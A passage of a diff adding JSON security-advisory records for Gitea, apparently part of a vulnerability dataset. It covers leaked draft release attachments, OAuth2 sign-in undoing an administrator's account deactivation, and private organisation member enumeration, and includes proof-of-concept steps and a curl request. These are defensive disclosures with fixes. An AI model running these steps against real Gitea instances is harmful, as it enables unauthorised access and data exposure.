release-notes drafts**: pre-disclosure of upcoming features or vulns.\r\n\r\nThese are not hypothetical use cases. They are the documented and intended use of the draft-release feature on every git forge.\r\n\r\n**Realistic attack scenarios (insider-leak threat model, same as CVE-2026-27660):**\r\n\r\n1. **Browser-UI \"Copy link\" causes the URL to leave the trust boundary.** A release engineer is preparing the next release and copies the `browser_download_url` to test the binary on a fresh VM, then pastes it into a Slack thread, a Jira ticket, an email to QA, or a commit message (\"`# binary: $URL`\"). Anyone who later reads that channel (including ex-employees, contractors who lost write access, or anyone scraping public Slack archives) has anonymous, unauthenticated, indefinite access to the draft binary.\r\n\r\n2. **Reverse-proxy or observability stack records the URL.** nginx, Caddy, HAProxy, Cloudflare, Datadog, Splunk, ELK: any HTTP-instrumentation pipeline records request paths. Anyone with log read access can extract UUIDs and pull the underlying attachment without authenticating to Gitea at all. For ELT pipelines that copy logs to cloud buckets or data lakes, that read access can be very broad.\r\n\r\n3. **Browser history, Referer, extension telemetry.** Once an authorized user downloads a draft attachment, the UUID-bearing URL lives in browser history, optional cloud-synced history (Chrome Sync, Edge Sync, Firefox Sync, recoverable on any signed-in device), browser extension telemetry, and any `Referer` header sent if the URL is loaded in a frame or via an inline asset.\r\n\r\n4. **Search-engine and mirror indexing.** Internal portals, asset inventories, dependency scanners, and SaaS supply-chain tools that follow `browser_download_url` to index release artifacts will index the draft URL just like a published one. Once indexed, the URL is discoverable for as long as the index lives.\r\n\r\n5. **Embedded links in public content.** A draft-release-attachment URL pasted into an issue comment, a PR description, a wiki page, or a README is rendered as a clickable `<a href>` to any reader of that public page. Readers don't see the draft release itself but get the attachment behind the link they click.\r\n\r\n**Severity calibration via direct precedent:**\r\n\r\n| Property | CVE-2026-27660 (this finding's API mirror) | This finding |\r\n|---|---|---|\r\n| Vulnerability class | Missing authorization on draft release | Missing authorization on draft release attachments |\r\n| Attack vector | Network | Network |\r\n| Privileges required | None (relies on UUID/ID being leaked) | None (relies on UUID being leaked) |\r\n| Attack complexity | High (must obtain UUID/ID) | High (must obtain UUID) |\r\n| Confidentiality | High | High |\r\n| Integrity / Availability | None | None |\r\n| Fix complexity | ~5-line authz check added at handler entry | ~5-line authz check added at handler entry |\r\n| Severity assigned by upstream | Medium | **Should be Medium (5.9) by direct precedent** |\r\n\r\nIf CVE-2026-27660 was accepted as a Medium-severity security advisory worth a dedicated PR, an identical bug in the web mirror of the same data is also Medium-severity. The maintainer cannot consistently rate this lower without retroactively downgrading their own previous fix.\r\n\r\n**CVSS 3.1:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` = **5.9 / Medium**\r\n\r\n- `AV:N`: reachable over the network.\r\n- `AC:H`: attacker must obtain the UUID via a leak channel (same prerequisite class as the upstream CVE).\r\n- `PR:N`: no authentication required (anonymous works).\r\n- `UI:N`: no user interaction required.\r\n- `S:U`: scope unchanged (still bounded to Gitea's auth boundary; the draft release was supposed to be inside that boundary but isn't).\r\n- `C:H`: full confidentiality breach of the attachment contents.\r\n- `I:N` / `A:N`: read-only.\r\n\r\n**Out of scope:** brute-forcing the UUID is infeasible (122 bits of UUIDv4 entropy). This is a confidentiality-loss bug, not an integrity or availability bug.\r\n\r\n**Deployment scale:** Gitea is a top-three self-hosted forge (~30 k+ public Internet-reachable instances per Shodan, plus very large numbers of internal corporate deployments and Codeberg / Forgejo derivatives that inherit the same code). The bug is present in the default configuration; no operator action is required to make a deployment vulnerable.\r\n\r\n**Fix complexity:** trivial. Add a `release.IsDraft && !perm.CanWrite(unit.TypeReleases)` check in `ServeAttachment` (single function, ~5 lines added). Patch is provided in the Details section. No data migration, no UX change, no breaking-API change.\r\n",
+          "ghsa_id": "GHSA-q9pg-jj6x-j9p6",
+          "html_url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-q9pg-jj6x-j9p6",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-q9pg-jj6x-j9p6"
+            },
+            {
+              "type": "CVE",
+              "value": "CVE-2026-58432"
+            }
+          ],
+          "private_fork": null,
+          "published_at": "2026-07-13T17:38:20Z",
+          "publisher": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/75789103?v=4",
+            "events_url": "https://api.github.com/users/bircni/events{/privacy}",
+            "followers_url": "https://api.github.com/users/bircni/followers",
+            "following_url": "https://api.github.com/users/bircni/following{/other_user}",
+            "gists_url": "https://api.github.com/users/bircni/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/bircni",
+            "id": 75789103,
+            "login": "bircni",
+            "node_id": "MDQ6VXNlcjc1Nzg5MTAz",
+            "organizations_url": "https://api.github.com/users/bircni/orgs",
+            "received_events_url": "https://api.github.com/users/bircni/received_events",
+            "repos_url": "https://api.github.com/users/bircni/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/bircni/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/bircni/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/bircni",
+            "user_view_type": "public"
+          },
+          "severity": "medium",
+          "state": "published",
+          "submission": null,
+          "summary": "Missing Authorization and Authorization Bypass Through User-Controlled Key and Incorrect Permission Assignment for Critical Resource and Exposure of Sensitive Information to an Unauthorized Actor in code.gitea.io/gitea",
+          "updated_at": "2026-07-13T17:38:20Z",
+          "url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-q9pg-jj6x-j9p6",
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "go",
+                "name": "code.gitea.io/gitea"
+              },
+              "patched_versions": "1.27.0",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "<= 1.26.4"
+            }
+          ],
+          "withdrawn_at": null
+        }
+      }
+    },
+    "repo": "go-gitea/gitea",
+    "selected_fixes": [
+      "f7fd51022495737cf960b8c4053a27d69148f664"
+    ]
+  },
+  "gitea-oauth-reactivation@canonical": {
+    "ids": {
+      "CVE-2026-55987": {
+        "cve": {
+          "_error": "HTTP error",
+          "_http_status": 404
+        }
+      },
+      "GHSA-VRHC-JJFC-M3M3": {
+        "global": {
+          "credits": [
+            {
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/97925674?v=4",
+                "events_url": "https://api.github.com/users/khoadb175/events{/privacy}",
+                "followers_url": "https://api.github.com/users/khoadb175/followers",
+                "following_url": "https://api.github.com/users/khoadb175/following{/other_user}",
+                "gists_url": "https://api.github.com/users/khoadb175/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/khoadb175",
+                "id": 97925674,
+                "login": "khoadb175",
+                "node_id": "U_kgDOBdY6Kg",
+                "organizations_url": "https://api.github.com/users/khoadb175/orgs",
+                "received_events_url": "https://api.github.com/users/khoadb175/received_events",
+                "repos_url": "https://api.github.com/users/khoadb175/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/khoadb175/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/khoadb175/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/khoadb175",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": "CVE-2026-55987",
+          "cvss": {
+            "score": 8.1,
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 8.1,
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
+            },
+            "cvss_v4": {
+              "score": 0.0,
+              "vector_string": null
+            }
+          },
+          "cwes": [
+            {
+              "cwe_id": "CWE-863",
+              "name": "Incorrect Authorization"
+            }
+          ],
+          "description": "## Description\n\nGitea's OAuth2 sign-in callback reactivates a deactivated user account (`IsActive=false`) when the user signs in through an authentication source that does not issue refresh tokens (notably GitHub, and any OIDC/OAuth2 source configured without `offline_access`). PR #38009 added a gate intended to reactivate users only when the OAuth2 auto-sync cron had disabled them, using \"the stored refresh token is empty\" as the signal. That signal is wrong: for sources that never issue refresh tokens, an empty refresh token is the normal state of every user, so the gate cannot distinguish a cron-disabled account from one an administrator deliberately deactivated. The next time the administrator-deactivated user signs in through the provider, Gitea sets `IsActive=true` and grants a full session, silently undoing the administrator's action. This is the exact behavior #38009 was written to prevent. (`ProhibitLogin`, the hard ban, is enforced separately and is not affected.)\n\nNo special privileges are required beyond being the deactivated user and being able to sign in through the source.\n\n### Root Cause\n\n`routers/web/auth/oauth.go` (the `handleOAuth2SignIn` reactivation gate):\n\n```go\nif !u.IsActive {\n    extLogin, hasExt, err := user_model.GetExternalLogin(ctx, authSource.ID, gothUser.UserID)\n    if err != nil { ctx.ServerError(\"GetExternalLogin\", err); return }\n    isDisabledByAutoSync := hasExt && extLogin.RefreshToken == \"\"   // wrong signal\n    if isDisabledByAutoSync {\n        opts.IsActive = optional.Some(true)                          // reactivates the account\n    }\n}\n```\n\nThe assumption that `RefreshToken == \"\"` is produced only by the auto-sync cron is false:\n\n- The cron's disable path is unreachable for sources without refresh tokens. `services/auth/source/oauth2/source_sync.go` returns early: `if !provider.RefreshTokenAvailable() { return ... }`, so it never disables (or touches the tokens of) such users.\n- The stored token is exactly what the provider returned, with no synthesizing: `services/externalaccount/user.go` stores `RefreshToken: gothUser.RefreshToken`. When the provider issues none, this is `\"\"` from the first login.\n- GitHub never issues a refresh token: `goth` hardcodes `func (p *Provider) RefreshTokenAvailable() bool { return false }` (`providers/github/github.go`). OIDC/OAuth2 without `offline_access` likewise store `\"\"`.\n\nSo for a GitHub (or no-refresh-token) source, `RefreshToken == \"\"` is the state of every user, including one an administrator deactivated, and the gate reactivates them.\n\n### Proof of Concept\n\nSetup:\n- A Gitea instance with a GitHub authentication source (Admin Panel -> Authentication Sources -> OAuth2 -> GitHub), or any OAuth2/OIDC source configured without `offline_access`.\n- Account V: a normal user who has signed in at least once through that source (an `external_login_user` row exists with empty `refresh_token`).\n\nSteps:\n1. As an administrator, open Admin Panel -> Users -> V and uncheck \"Activated\" (`is_active=false`). Confirm V's requests now bounce to the activation page.\n2. As V, sign in again via \"Sign in with GitHub\" and complete the provider flow.\n3. V lands in the application with a working session. `SELECT is_active FROM \"user\" WHERE lower_name='v';` now returns `true`.\n\nExpected (intended by #38009): V stays `is_active=false` and is routed to the activation page.\nActual: V is `is_active=true` with a full session — the administrator's deactivation is undone.\n\n```\n- GitHub user, ADMIN deactivated                 refreshToken=\"\"    -> REACTIVATED + session granted   <<< admin action undone\n- OIDC user w/ refresh token, ADMIN deactivated  refreshToken=\"...\" -> stays disabled  (control)\n- OIDC user, AUTO-SYNC cron disabled             refreshToken=\"\"    -> REACTIVATED (intended)\nRESULT: BYPASS CONFIRMED.\n```\n\nGitea's own regression test `TestOAuth2CallbackReactivationGating` (\"auto-sync-disabled user is reactivated\") sets `RefreshToken=\"\"` and asserts reactivation after a full OIDC callback — that state is identical to a GitHub-source user an administrator deactivated.\n\n### Impact\n\nAny Gitea instance using a GitHub authentication source (one of the most common) or an OIDC/OAuth2 source without refresh tokens, that relies on the \"Activated\" toggle to disable accounts, is affected. A deactivated user restores their own account to active and obtains a session, regaining whatever access the account had. Deactivation does not clear `IsAdmin`, so a deactivated administrator regains admin access. Bound: accounts disabled with \"Prohibit Login\" stay blocked; this defeats the `IsActive=false` deactivation only.",
+          "ghsa_id": "GHSA-vrhc-jjfc-m3m3",
+          "github_reviewed_at": "2026-07-21T21:02:10Z",
+          "html_url": "https://github.com/advisories/GHSA-vrhc-jjfc-m3m3",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-vrhc-jjfc-m3m3"
+            },
+            {
+              "type": "CVE",
+              "value": "CVE-2026-55987"
+            }
+          ],
+          "nvd_published_at": null,
+          "published_at": "2026-07-21T21:02:10Z",
+          "references": [
+            "https://github.com/go-gitea/gitea/security/advisories/GHSA-vrhc-jjfc-m3m3",
+            "https://github.com/go-gitea/gitea/releases/tag/v1.27.0",
+            "https://github.com/advisories/GHSA-vrhc-jjfc-m3m3"
+          ],
+          "repository_advisory_url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-vrhc-jjfc-m3m3",
+          "severity": "high",
+          "source_code_location": "https://github.com/go-gitea/gitea",
+          "summary": "Gitea: OAuth2 sign-in reactivates an administrator-deactivated account on auth sources without refresh tokens (incomplete fix of #38009)",
+          "type": "reviewed",
+          "updated_at": "2026-07-21T21:02:10Z",
+          "url": "https://api.github.com/advisories/GHSA-vrhc-jjfc-m3m3",
+          "vulnerabilities": [
+            {
+              "first_patched_version": "1.27.0",
+              "package": {
+                "ecosystem": "go",
+                "name": "code.gitea.io/gitea"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "< 1.27.0"
+            }
+          ],
+          "withdrawn_at": null
+        },
+        "repo": {
+          "author": null,
+          "closed_at": null,
+          "collaborating_teams": null,
+          "collaborating_users": null,
+          "created_at": null,
+          "credits": [
+            {
+              "login": "khoadb175",
+              "type": "reporter"
+            }
+          ],
+          "credits_detailed": [
+            {
+              "state": "accepted",
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/97925674?v=4",
+                "events_url": "https://api.github.com/users/khoadb175/events{/privacy}",
+                "followers_url": "https://api.github.com/users/khoadb175/followers",
+                "following_url": "https://api.github.com/users/khoadb175/following{/other_user}",
+                "gists_url": "https://api.github.com/users/khoadb175/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/khoadb175",
+                "id": 97925674,
+                "login": "khoadb175",
+                "node_id": "U_kgDOBdY6Kg",
+                "organizations_url": "https://api.github.com/users/khoadb175/orgs",
+                "received_events_url": "https://api.github.com/users/khoadb175/received_events",
+                "repos_url": "https://api.github.com/users/khoadb175/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/khoadb175/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/khoadb175/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/khoadb175",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": "CVE-2026-55987",
+          "cvss": {
+            "score": 8.1,
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 8.1,
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
+            },
+            "cvss_v4": {
+              "score": null,
+              "vector_string": null
+            }
+          },
+          "cwe_ids": [
+            "CWE-863"
+          ],
+          "cwes": [
+            {
+              "cwe_id": "CWE-863",
+              "name": "Incorrect Authorization"
+            }
+          ],
+          "description": "## Description\r\n\r\nGitea's OAuth2 sign-in callback reactivates a deactivated user account (`IsActive=false`) when the user signs in through an authentication source that does not issue refresh tokens (notably GitHub, and any OIDC/OAuth2 source configured without `offline_access`). PR #38009 added a gate intended to reactivate users only when the OAuth2 auto-sync cron had disabled them, using \"the stored refresh token is empty\" as the signal. That signal is wrong: for sources that never issue refresh tokens, an empty refresh token is the normal state of every user, so the gate cannot distinguish a cron-disabled account from one an administrator deliberately deactivated. The next time the administrator-deactivated user signs in through the provider, Gitea sets `IsActive=true` and grants a full session, silently undoing the administrator's action. This is the exact behavior #38009 was written to prevent. (`ProhibitLogin`, the hard ban, is enforced separately and is not affected.)\r\n\r\nNo special privileges are required beyond being the deactivated user and being able to sign in through the source.\r\n\r\n### Root Cause\r\n\r\n`routers/web/auth/oauth.go` (the `handleOAuth2SignIn` reactivation gate):\r\n\r\n```go\r\nif !u.IsActive {\r\n    extLogin, hasExt, err := user_model.GetExternalLogin(ctx, authSource.ID, gothUser.UserID)\r\n    if err != nil { ctx.ServerError(\"GetExternalLogin\", err); return }\r\n    isDisabledByAutoSync := hasExt && extLogin.RefreshToken == \"\"   // wrong signal\r\n    if isDisabledByAutoSync {\r\n        opts.IsActive = optional.Some(true)                          // reactivates the account\r\n    }\r\n}\r\n```\r\n\r\nThe assumption that `RefreshToken == \"\"` is produced only by the auto-sync cron is false:\r\n\r\n- The cron's disable path is unreachable for sources without refresh tokens. `services/auth/source/oauth2/source_sync.go` returns early: `if !provider.RefreshTokenAvailable() { return ... }`, so it never disables (or touches the tokens of) such users.\r\n- The stored token is exactly what the provider returned, with no synthesizing: `services/externalaccount/user.go` stores `RefreshToken: gothUser.RefreshToken`. When the provider issues none, this is `\"\"` from the first login.\r\n- GitHub never issues a refresh token: `goth` hardcodes `func (p *Provider) RefreshTokenAvailable() bool { return false }` (`providers/github/github.go`). OIDC/OAuth2 without `offline_access` likewise store `\"\"`.\r\n\r\nSo for a GitHub (or no-refresh-token) source, `RefreshToken == \"\"` is the state of every user, including one an administrator deactivated, and the gate reactivates them.\r\n\r\n### Proof of Concept\r\n\r\nSetup:\r\n- A Gitea instance with a GitHub authentication source (Admin Panel -> Authentication Sources -> OAuth2 -> GitHub), or any OAuth2/OIDC source configured without `offline_access`.\r\n- Account V: a normal user who has signed in at least once through that source (an `external_login_user` row exists with empty `refresh_token`).\r\n\r\nSteps:\r\n1. As an administrator, open Admin Panel -> Users -> V and uncheck \"Activated\" (`is_active=false`). Confirm V's requests now bounce to the activation page.\r\n2. As V, sign in again via \"Sign in with GitHub\" and complete the provider flow.\r\n3. V lands in the application with a working session. `SELECT is_active FROM \"user\" WHERE lower_name='v';` now returns `true`.\r\n\r\nExpected (intended by #38009): V stays `is_active=false` and is routed to the activation page.\r\nActual: V is `is_active=true` with a full session — the administrator's deactivation is undone.\r\n\r\n```\r\n- GitHub user, ADMIN deactivated                 refreshToken=\"\"    -> REACTIVATED + session granted   <<< admin action undone\r\n- OIDC user w/ refresh token, ADMIN deactivated  refreshToken=\"...\" -> stays disabled  (control)\r\n- OIDC user, AUTO-SYNC cron disabled             refreshToken=\"\"    -> REACTIVATED (intended)\r\nRESULT: BYPASS CONFIRMED.\r\n```\r\n\r\nGitea's own regression test `TestOAuth2CallbackReactivationGating` (\"auto-sync-disabled user is reactivated\") sets `RefreshToken=\"\"` and asserts reactivation after a full OIDC callback — that state is identical to a GitHub-source user an administrator deactivated.\r\n\r\n### Impact\r\n\r\nAny Gitea instance using a GitHub authentication source (one of the most common) or an OIDC/OAuth2 source without refresh tokens, that relies on the \"Activated\" toggle to disable accounts, is affected. A deactivated user restores their own account to active and obtains a session, regaining whatever access the account had. Deactivation does not clear `IsAdmin`, so a deactivated administrator regains admin access. Bound: accounts disabled with \"Prohibit Login\" stay blocked; this defeats the `IsActive=false` deactivation only.",
+          "ghsa_id": "GHSA-vrhc-jjfc-m3m3",
+          "html_url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-vrhc-jjfc-m3m3",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-vrhc-jjfc-m3m3"
+            },
+            {
+              "type": "CVE",
+              "value": "CVE-2026-55987"
+            }
+          ],
+          "private_fork": null,
+          "published_at": "2026-07-13T17:38:08Z",
+          "publisher": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/75789103?v=4",
+            "events_url": "https://api.github.com/users/bircni/events{/privacy}",
+            "followers_url": "https://api.github.com/users/bircni/followers",
+            "following_url": "https://api.github.com/users/bircni/following{/other_user}",
+            "gists_url": "https://api.github.com/users/bircni/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/bircni",
+            "id": 75789103,
+            "login": "bircni",
+            "node_id": "MDQ6VXNlcjc1Nzg5MTAz",
+            "organizations_url": "https://api.github.com/users/bircni/orgs",
+            "received_events_url": "https://api.github.com/users/bircni/received_events",
+            "repos_url": "https://api.github.com/users/bircni/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/bircni/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/bircni/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/bircni",
+            "user_view_type": "public"
+          },
+          "severity": "high",
+          "state": "published",
+          "submission": null,
+          "summary": "OAuth2 sign-in reactivates an administrator-deactivated account on auth sources without refresh tokens (incomplete fix of #38009)",
+          "updated_at": "2026-07-13T17:38:08Z",
+          "url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-vrhc-jjfc-m3m3",
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "go",
+                "name": "code.gitea.io/gitea"
+              },
+              "patched_versions": "1.27.0",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "<= 1.26.4"
+            }
+          ],
+          "withdrawn_at": null
+        }
+      }
+    },
+    "repo": "go-gitea/gitea",
+    "selected_fixes": [
+      "fce961b44aa9631f8e9f5d6b3168d16d9a6728af"
+    ]
+  },
+  "gitea-private-org-members@canonical": {
+    "ids": {
+      "CVE-2026-58427": {
+        "cve": {
+          "_error": "HTTP error",
+          "_http_status": 404
+        }
+      },
+      "GHSA-PRR9-9MP4-5GP2": {
+        "global": {
+          "credits": [
+            {
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/84002020?v=4",
+                "events_url": "https://api.github.com/users/Razzlemouse/events{/privacy}",
+                "followers_url": "https://api.github.com/users/Razzlemouse/followers",
+                "following_url": "https://api.github.com/users/Razzlemouse/following{/other_user}",
+                "gists_url": "https://api.github.com/users/Razzlemouse/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/Razzlemouse",
+                "id": 84002020,
+                "login": "Razzlemouse",
+                "node_id": "MDQ6VXNlcjg0MDAyMDIw",
+                "organizations_url": "https://api.github.com/users/Razzlemouse/orgs",
+                "received_events_url": "https://api.github.com/users/Razzlemouse/received_events",
+                "repos_url": "https://api.github.com/users/Razzlemouse/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/Razzlemouse/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/Razzlemouse/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/Razzlemouse",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": "CVE-2026-58427",
+          "cvss": {
+            "score": null,
+            "vector_string": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 0.0,
+              "vector_string": null
+            },
+            "cvss_v4": {
+              "score": 0.0,
+              "vector_string": null
+            }
+          },
+          "cwes": [
+            {
+              "cwe_id": "CWE-200",
+              "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+            },
+            {
+              "cwe_id": "CWE-863",
+              "name": "Incorrect Authorization"
+            }
+          ],
+          "description": "## Summary\nPR #38145 fixed ListPublicMembers and IsPublicMember but missed \nListMembers. Any authenticated user can enumerate ALL members \n(not just public ones) of a private organization.\n\n## Affected Versions\n<= v1.26.4 (latest) and main branch\n\n## Root Cause\nrouters/api/v1/org/member.go — ListMembers():\n\n// Missing check:\nif !organization.HasOrgOrUserVisible(ctx, \n    ctx.Org.Organization.AsUser(), ctx.Doer) {\n    ctx.APIErrorNotFound()\n    return\n}\n\n## Proof of Concept\n\n# Setup: privateorg (private), alice = member, bob = outsider\n\n# Bob lists ALL members of private org\ncurl -s \"http://gitea/api/v1/orgs/privateorg/members\" \\\n  -H \"Authorization: token BOB_TOKEN\"\n\n# Result: HTTP 200\n[{\"login\":\"alice\",\"email\":\"alice@test.com\",...}]\n# Expected: HTTP 404\n\n## Note\nThis is an incomplete fix variant of PR #38145.\nThat PR fixed public_members endpoints only.\nListMembers (/orgs/{org}/members) remains unpatched.\n\n## Fix\nAdd to ListMembers():\nif !organization.HasOrgOrUserVisible(ctx, \n    ctx.Org.Organization.AsUser(), ctx.Doer) {\n    ctx.APIErrorNotFound()\n    return\n}",
+          "ghsa_id": "GHSA-prr9-9mp4-5gp2",
+          "github_reviewed_at": "2026-07-21T21:49:00Z",
+          "html_url": "https://github.com/advisories/GHSA-prr9-9mp4-5gp2",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-prr9-9mp4-5gp2"
+            },
+            {
+              "type": "CVE",
+              "value": "CVE-2026-58427"
+            }
+          ],
+          "nvd_published_at": null,
+          "published_at": "2026-07-21T21:49:00Z",
+          "references": [
+            "https://github.com/go-gitea/gitea/security/advisories/GHSA-prr9-9mp4-5gp2",
+            "https://github.com/go-gitea/gitea/releases/tag/v1.27.0",
+            "https://github.com/advisories/GHSA-prr9-9mp4-5gp2"
+          ],
+          "repository_advisory_url": "https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-prr9-9mp4-5gp2",
+          "severity": "medium",
+          "source_code_location": "https://github.com/go-gitea/gitea",
+          "summary": "Gitea: Private org member list leaked via /members API endpoint — incomplete fix for PR #38145",
+          "type": "reviewed",
+          "updated_at": "2026-07-21T21:49:02Z",
+          "url": "https://api.github.com/advisories/GHSA-prr9-9mp4-5gp2",
+          "vulnerabilities": [
+            {
+              "first_patched_version": "1.27.0",
+              "package": {
+                "ecosystem": "go",
+                "name": "gitea.dev"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "< 1.27.0"
+            }
+          ],
+          "withdrawn_at": null
+        },
+        "repo": {
+          "author": null,
+          "closed_at": null,
+          "collaborating_teams": null,
+          "collaborating_users": null,
+          "created_at": null,
+          "credits": [
+            {
+              "login": "Razzlemouse",
+              "type": "reporter"
+            }
+          ],
+          "credits_detailed": [
+            {
+              "state": "accepted",
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/84002020?v=4",
+                "events_url": "https://api.github.com/users/Razzlemouse/events{/privacy}",
+                "followers_url": "https://api.github.com/users/Razzlemouse/followers",
+                "following_url": "https://api.github.com/users/Razzlemouse/following{/other_user}",
+                "gists_url": "https://api.github.com/users/Razzlemouse/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/Razzlemouse",
+                "id": 84002020,
+                "login": "Razzlemouse",
+                "node_id": "MDQ6VXNlcjg0MDAyMDIw",
+                "organizations_url": "https://api.github.com/users/Razzlemouse/orgs",
+                "received_events_url": "https://api.github.com/users/Razzlemouse/received_events",
+                "repos_url": "https://api.github.com/users/Razzlemouse/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/Razzlemouse/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/Razzlemouse/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/Razzlemouse",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": "CVE-2026-58427",
+          "cvss": {
+            "score": null,
+            "vector_string": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": null,
+              "vector_string": null
+            },
+            "cvss_v4": {
+              "score": null,
+              "vector_string": null
+            }
+          },
+          "cwe_ids": [
+            "CWE-200",
+            "CWE-863"
+          ],
+          "cwes": [
+            {
+              "cwe_id": "CWE-200",
+              "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+            },
+            {
+              "cwe_id": "CWE-863",
+              "name": "Incorrect Authorization"
+            }
+          ],
+          "description": "## Summary\r\nPR #38145 fixed ListPublicMembers and IsPublicMember but missed \r\nListMembers. Any authenticated user can enumerate ALL members \r\n(not just public ones) of a private organization.\r\n\r\n## Affected Versions\r\n<= v1.26.4 (latest) and main branch\r\n\r\n## Root Cause\r\nrouters/api/v1/org/member.go — ListMembers():\r\n\r\n// Missing check:\r\nif !organization.HasOrgOrUserVisible(ctx, \r\n    ctx.Org.Organization.AsUser(), ctx.Doer) {\r\n    ctx.APIErrorNotFound()\r\n    return\r\n}\r\n\r\n## Proof of Concept\r\n\r\n# Setup: privateorg (private), alice = member, bob = outsider\r\n\r\n# Bob lists ALL members of private org\r\ncurl -s \"http://gitea/api/v1/orgs/privateorg/members\" \\\r\n  -H \"Authorization: token BOB_TOKEN\"\r\n\r\n# Result: HTTP 200\r\n[{\"login\":\"alice\",\"email\":\"alice@test.com\",...}]\r\n# Expected: HTTP 404\r\n\r\n## Note\r\nThis is an incomplete fix variant of PR #38145.\r\nThat PR fixed public_members endpoints only.\r\nListMembers (/orgs/{org}/members) remains unpatched.\r\n\r\n## Fix\r\nAdd to ListMembers():\r\nif !organization.HasOrgOrUserVisible(ctx, \r\n    ctx.Org.Organization.AsUser(), ctx.Doer) {\r\n    ctx.APIErrorNotFound()\r\n    return\r\n}\r\n",
+          "ghsa_id": "GHSA-prr9-9mp4-5gp2",
+          "html_url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-prr9-9mp4-5gp2",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-prr9-9mp4-5gp2"
+            },
+            {
+              "type": "CVE",
+              "value": "CVE-2026-58427"
+            }
+          ],
+          "private_fork": null,
+          "published_at": "2026-07-13T17:30:04Z",
+          "publisher": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/75789103?v=4",
+            "events_url": "https://api.github.com/users/bircni/events{/privacy}",
+            "followers_url": "https://api.github.com/users/bircni/followers",
+            "following_url": "https://api.github.com/users/bircni/following{/other_user}",
+            "gists_url": "https://api.github.com/users/bircni/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/bircni",
+            "id": 75789103,
+            "login": "bircni",
+            "node_id": "MDQ6VXNlcjc1Nzg5MTAz",
+            "organizations_url": "https://api.github.com/users/bircni/orgs",
+            "received_events_url": "https://api.github.com/users/bircni/received_events",
+            "repos_url": "https://api.github.com/users/bircni/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/bircni/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/bircni/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/bircni",
+            "user_view_type": "public"
+          },
+          "severity": "medium",
+          "state": "published",
+          "submission": null,
+          "summary": "Private org member list leaked via /members API endpoint — incomplete fix for PR #38145",
+          "updated_at": "2026-07-19T03:05:14Z",
